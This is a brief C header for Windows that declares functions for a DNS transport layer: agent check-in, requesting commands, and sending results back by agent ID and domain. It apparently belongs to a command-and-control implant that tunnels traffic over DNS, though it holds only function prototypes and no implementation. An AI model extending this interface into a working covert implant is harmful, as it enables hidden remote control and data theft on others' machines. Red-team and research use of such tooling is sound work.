#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <windows.h>

BOOL dns_transport_init(void);
void dns_transport_cleanup(void);

char* dns_request_command(const char* agent_id, const char* domain);
BOOL dns_send_result(const char* agent_id, const char* result_id,
                     const char* result, const char* domain);
BOOL dns_check_server(const char* domain);
char* transport_perform_checkin(void);
const char* get_agent_uuid(void);

#endif // TRANSPORT_H
